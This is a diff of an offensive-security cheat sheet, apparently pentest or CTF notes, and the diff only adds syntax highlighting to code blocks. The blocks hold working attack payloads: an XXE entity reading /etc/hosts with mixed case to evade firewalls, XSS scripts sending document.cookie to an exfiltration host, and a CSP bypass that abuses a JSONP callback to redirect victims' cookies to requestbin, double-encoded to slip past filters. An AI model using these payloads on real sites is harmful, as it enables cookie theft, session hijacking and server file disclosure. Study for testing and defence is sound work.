@@ -374,7 +374,7 @@ load config
 XXE standard:  
 * NOTE: "FILe" upper/lowercase mix was to bypass firewalls
 * Use a valid XML feed, otherwise it will probably fail to parse. i.e. chuck `&xxe;` in legit xml elements in the feed.
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
         <!ENTITY xxe SYSTEM "FILe:%2F%2F%2Fetc/hosts" >
@@ -398,7 +398,7 @@ _Example blacklisted keywords: [file://] [/etc] [passwd] or 2nd level XML docs i
 ---
 **Useful JS web API methods for XSS**  
 Redirect a user/admin to your url to steal their cookies.
-```
+```javascript
 fetch()
 window.onload()
 document.location()
@@ -408,24 +408,24 @@ window.location.assign()
 ```
 
 **Standard Payloads ad Filter Evasion**
-```
+```javascript
 <script>document.write(“<img src=http://exfil.point/lol?”+document.cookie);</script>
 <script>document.write(“<img src=http://exfil.point/lol?”+document.cookie);</script>
 ```
 
 **CSP Bypass**  
 Bypass via. JSONP API callback param:
-```
-Verify:
+```javascript
+//Verify:
 <script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=alert('xss');//"></script>
 
-Payload Original:
+//Payload Original:
 <script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c='+document.cookie);//"></script>
 
-Payload Step #1 => Encode x1:
+//Payload Step #1 => Encode x1:
 <script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%3D'%2Bdocument.cookie);//"></script>
 
-Payload Step #2 => Encode x2:
+//Payload Step #2 => Encode x2:
 <script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%253D'%252Bdocument.cookie);//"></script>
 
 Note:
@@ -482,7 +482,7 @@ http://0:9200/phrack/article/14
 ```
 
 PHP:
-```
+```php
 file_get_contents()
 fsockopen()
 curl_exec()
